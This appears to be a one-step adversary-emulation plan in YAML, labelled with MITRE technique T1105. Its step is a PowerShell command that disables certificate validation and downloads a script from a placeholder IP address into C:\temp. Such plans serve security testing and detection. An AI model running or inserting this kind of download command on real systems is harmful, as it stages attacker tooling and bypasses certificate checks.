steps:
- id: step-01
  name: Download AppleScript
  command: powershell -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback
    = {$true}; $client = New-Object System.Net.WebClient; $client.DownloadFile('http://192.0.2.10/script.scpt',
    'C:\\temp\\script.scpt');"
  identity: direct
  mitre_technique: T1105
